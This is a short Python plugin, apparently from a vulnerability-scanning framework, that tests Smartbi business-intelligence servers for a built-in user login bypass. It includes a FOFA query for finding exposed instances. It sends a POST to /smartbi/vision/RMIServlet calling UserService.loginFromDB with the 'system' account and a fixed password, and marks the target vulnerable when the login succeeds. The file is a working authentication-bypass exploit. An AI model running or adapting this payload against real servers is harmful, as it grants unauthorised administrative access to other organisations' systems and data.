#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/sGOiq45HGl9xGMBJQRQ4FA',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'Smartbi内置用户登陆绕过',

      'level'     :   'high',

      'FOFA'      :   'app="SMARTBI"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/smartbi/vision/RMIServlet'
  url1 = url + target

  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if re.search(r'retCode.*?CLIENT_USER_NOT_LOGIN.*?result.*?',res.text,re.S):
      res.close()
    else:

      return ret
  except:
    return ret
  try:
    headers['Content-Type'] = 'application/x-www-form-urlencoded'
    payload = url + '/smartbi/vision/RMIServlet'
    data = 'className=UserService&methodName=loginFromDB&params=["system","0a"]'
    # print(data)
    resp=requests.post(url=url1,headers=headers,data=data,timeout=10)
    # print(resp.text)
    if re.search(r'retCode.*?0.*?result.*?true.*?duration.*?',resp.text,re.S):
      # ret['huixian'] = res.text
      resp.close()
      ret['url'] = url1
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret